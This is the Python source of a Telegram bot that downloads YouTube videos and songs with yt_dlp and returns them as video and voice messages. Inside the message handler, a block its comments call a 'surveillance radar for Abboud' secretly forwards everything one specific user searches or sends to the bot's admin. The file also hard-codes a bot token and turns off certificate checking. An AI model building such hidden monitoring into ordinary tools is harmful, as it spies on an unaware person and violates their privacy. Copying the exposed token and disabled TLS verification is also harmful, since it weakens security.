import os
import yt_dlp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات الأساسية ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711  # أيديك أنت يا بطل (صورة 1404)
TARGET_USER_ID = 2034540192 # أيدي عبود للمراقبة (صورة 1407)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("هلا بيك! دز رابط أو اكتب 'اسم الأغنية' حتى أحملها إلك 🚀🎤")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    # تحديد إذا كان البحث أو رابط
    if text.startswith("http"):
        url = text
        is_search = False
    else:
        # إذا بدأت الرسالة بكلمة "بحث" أو كان مجرد نص
        await update.message.reply_text(f"🔎 جاي أبحث لك عن: {text} ...")
        url = f"ytsearch1:{text}"
        is_search = True

    # رادار المراقبة لعبود
    if user.id == TARGET_USER_ID:
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎯 عبود بحث/دز: {text}")

    try:
        ydl_opts = {
            'format': 'best',
            'outtmpl': f'file_{user.id}.%(ext)s',
            'quiet': True,
            'no_warnings': True,
            'ignoreerrors': True,
            'nocheckcertificate': True,
            'add_header': ['User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)']
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if is_search:
                if 'entries' in info and len(info['entries']) > 0:
                    info = info['entries'][0]
                else:
                    raise Exception("لم يتم العثور على نتائج")
            
            filename = ydl.prepare_filename(info)
            title = info.get('title', 'محتوى جديد')
            video_url = info.get('webpage_url', 'رابط غير متاح')

            # إرسال الرابط للمستخدم أولاً
            if is_search:
                await update.message.reply_text(f"✅ لقيتها! هذا رابطها:\n{video_url}\n\nجاي أحمل الفيديو والبصمة... ⏳")

            # إرسال الفيديو والبصمة (مثل صورة 1409)
            with open(filename, 'rb') as f:
                await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"🎬 {title}")
            with open(filename, 'rb') as f:
                await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption=f"🎤 بصمة: {title}")
            
            os.remove(filename)
                
    except Exception as e:
        # إذا فشل البحث أو التحميل
        if not is_search:
             await update.message.reply_text("❌ صار خطأ.. تأكد من الرابط!") # (صورة 1405)
        else:
             await update.message.reply_text("❌ ما لقيت الأغنية، جرب اسم ثاني!")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
